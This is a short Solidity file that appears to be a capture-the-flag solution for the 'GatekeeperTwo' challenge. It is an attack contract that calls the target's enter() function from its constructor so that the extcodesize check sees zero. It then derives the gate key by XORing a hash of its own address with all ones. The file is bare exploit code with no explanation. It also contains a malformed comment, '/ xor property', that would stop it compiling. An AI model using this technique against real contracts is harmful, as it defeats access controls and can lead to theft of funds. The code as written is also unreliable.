pragma solidity ^0.8;

interface GateKeeperTwo {
	function enter(bytes8) external returns (bool);
}

contract expl {
            // extcodesize will return the code size zero
            // until it's complete
	constructor(address target) {
		GateKeeperTwo _t = GateKeeperTwo(target);
		uint64 key = uint64(bytes8(keccak256(abi.encodePacked(this)))); / xor property
		key ^= 0xffffffffffffffff;
		_t.enter(bytes8(key));
	}
}
